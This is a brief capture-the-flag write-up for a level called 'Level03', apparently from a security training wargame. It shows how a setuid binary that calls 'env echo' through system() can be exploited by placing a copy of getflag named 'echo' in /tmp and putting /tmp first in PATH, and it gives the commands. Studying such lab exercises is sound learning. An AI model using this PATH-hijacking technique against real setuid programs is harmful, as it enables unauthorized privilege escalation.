## Level03

When we log into the level03 account, we are greeted with a binary named `level03` and setuid to flag03.
Using `ltrace` shows us `system("/usr/bin/env echo Exploit me"Exploit me`, which means we can modify
the env path to replace the `echo` called by the binary to `getflag`:  
```
cp /bin/getflag /tmp/echo
export PATH=/tmp/:$PATH
./level03
```